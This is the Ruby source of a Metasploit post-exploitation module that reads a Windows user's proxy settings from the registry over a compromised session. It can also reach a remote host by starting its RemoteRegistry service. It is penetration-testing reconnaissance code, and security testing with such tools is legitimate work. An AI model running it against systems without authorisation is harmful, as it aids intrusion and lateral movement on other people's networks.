##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services

  def initialize
    super(
      'Name' => 'Windows Gather Proxy Setting',
      'Description' => %q{
        This module pulls a user's proxy settings. If neither RHOST or SID
        are set it pulls the current user, else it will pull the user's settings
        for the specified SID and target host.
      },
      'Author' => [ 'mubix' ],
      'License' => MSF_LICENSE,
      'Platform' => [ 'win' ],
      'SessionTypes' => %w[meterpreter powershell shell],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'Reliability' => [],
        'SideEffects' => []
      },
      'Compat' => {
        'Meterpreter' => {
          'Commands' => %w[
            stdapi_registry_open_key
            stdapi_registry_open_remote_key
          ]
        }
      }
    )

    register_options([
      OptAddress.new('RHOST', [ false, 'Remote host to clone settings to, defaults to local' ]),
      OptString.new('SID', [ false, 'SID of user to clone settings to (SYSTEM is S-1-5-18)' ])
    ])
  end

  def run
    if datastore['SID']
      root_key, base_key = split_key("HKU\\#{datastore['SID']}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
    else
      root_key, base_key = split_key('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections')
    end

    if datastore['RHOST']
      if session.type != 'meterpreter'
        fail_with(Failure::BadConfig, "Cannot query remote registry on #{datastore['RHOST']}. Unsupported sesssion type #{session.type}")
      end

      begin
        key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
      rescue ::Rex::Post::Meterpreter::RequestError
        print_error("Unable to contact remote registry service on #{datastore['RHOST']}")
        print_status('Attempting to start RemoteRegistry service remotely...')
        begin
          service_start('RemoteRegistry', datastore['RHOST'])
        rescue StandardError
          fail_with(Failure::Unknown, 'Unable to start RemoteRegistry service, exiting...')
        end
        startedreg = true
        key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
      end

      open_key = key.open_key(base_key)
      values = open_key.query_value('DefaultConnectionSettings')
      data = values.data

      # If we started the service we need to stop it.
      service_stop('RemoteRegistry', datastore['RHOST']) if startedreg
    else
      data = registry_getvaldata("#{root_key}\\#{base_key}", 'DefaultConnectionSettings')
    end

    fail_with(Failure::Unknown, "Could not retrieve 'DefaultConnectionSettings' data") if data.blank?
    fail_with(Failure::Unknown, "Retrieved malformed proxy settings (too small: #{data.length} bytes <= 24 bytes)") if data.length <= 24

    print_status("Proxy Counter = #{data[4, 1].unpack('C*')[0]}")

    case data[8, 1].unpack('C*')[0]
    when 1
      print_status('Setting: No proxy settings')
    when 3
      print_status('Setting: Proxy server')
    when 5
      print_status('Setting: Set proxy via AutoConfigure script')
    when 7
      print_status('Setting: Proxy server and AutoConfigure script')
    when 9
      print_status('Setting: WPAD')
    when 11
      print_status('Setting: WPAD and Proxy server')
    when 13
      print_status('Setting: WPAD and AutoConfigure script')
    when 15
      print_status('Setting: WPAD, Proxy server and AutoConfigure script')
    else
      print_status('Setting: Unknown proxy setting found')
    end

    cursor = 12
    proxyserver = data[cursor + 4, data[cursor, 1].unpack('C*')[0]]
    print_status("Proxy Server: #{proxyserver}") unless proxyserver.blank?

    cursor = cursor + 4 + data[cursor].unpack('C*')[0]
    additionalinfo = data[cursor + 4, data[cursor, 1].unpack('C*')[0]]
    print_status("Additional Info: #{additionalinfo}") unless additionalinfo.blank?

    cursor = cursor + 4 + data[cursor].unpack('C*')[0]
    autoconfigurl = data[cursor + 4, data[cursor, 1].unpack('C*')[0]]
    print_status("AutoConfigURL: #{autoconfigurl}") unless autoconfigurl.blank?
  end
end
